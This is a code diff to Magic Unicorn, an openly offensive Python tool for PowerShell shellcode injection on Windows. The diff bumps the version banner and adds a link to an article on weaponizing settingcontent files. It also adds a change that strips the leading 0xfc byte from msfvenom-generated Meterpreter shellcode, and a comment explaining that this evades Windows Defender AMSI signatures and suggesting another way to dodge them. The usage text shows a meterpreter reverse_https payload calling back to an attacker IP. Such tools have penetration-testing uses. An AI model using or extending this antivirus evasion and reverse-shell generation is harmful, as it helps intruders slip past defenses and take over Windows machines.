@@ -415,6 +415,8 @@ then download the Unicorn HTA file which has the code execution capabilites.
 
 Special thanks and kudos to Matt Nelson for the awesome research
 
+Also check out: https://www.trustedsec.com/2018/06/weaponizing-settingcontent/
+
 Usage: 
 
 python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
@@ -426,7 +428,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.2 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.2.1 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -677,6 +679,8 @@ def generate_shellcode(payload, ipaddr, port):
     else:
         proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c".format( payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
+        # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
+        data = data.replace('"\\xfc', '"', 1)
 
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
